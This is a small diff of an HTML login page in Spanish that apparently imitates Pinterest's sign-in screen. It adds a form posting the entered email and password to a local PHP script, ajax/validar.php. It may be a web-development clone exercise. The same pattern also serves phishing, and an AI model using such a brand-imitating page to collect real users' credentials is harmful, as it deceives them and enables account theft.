@@ -21,17 +21,19 @@
 					<div id="div-info">
 						<h3 id="div-estiloLetra">Inicia sesión para ver más</h3>
 					</div>
-
+                    
 					<div id="div-texto">
 						<div id="div-espacio">
-							<input type="email" aria-label="Correo o número de teléfono" placeholder="Correo o número de teléfono" id="div-telefono-contrasena">
+							<form action="ajax/validar.php" method="POST">
+							<input type="email" aria-label="Correo o número de teléfono" name="txt-correo" placeholder="Correo o número de teléfono" id="div-telefono-contrasena">
 						</div>
 						<div>
-							<input type="password" aria-label="Contraseña" placeholder="Contraseña" id="div-telefono-contrasena">
+							<input type="password" aria-label="Contraseña" name="txt-password"  placeholder="Contraseña" id="div-telefono-contrasena">
 						</div id="div-espacio">
 						<div>
 							<a href="pinterest.html"><button class="red SignupButton active" id="div-btnSesion" type="submit"><div>Iniciar sesión</div></button></a>
 						</div>
+                        </form>
 						<div id="div-espacio"></div>
 						<div>
 							<p id="div-o">O</p>
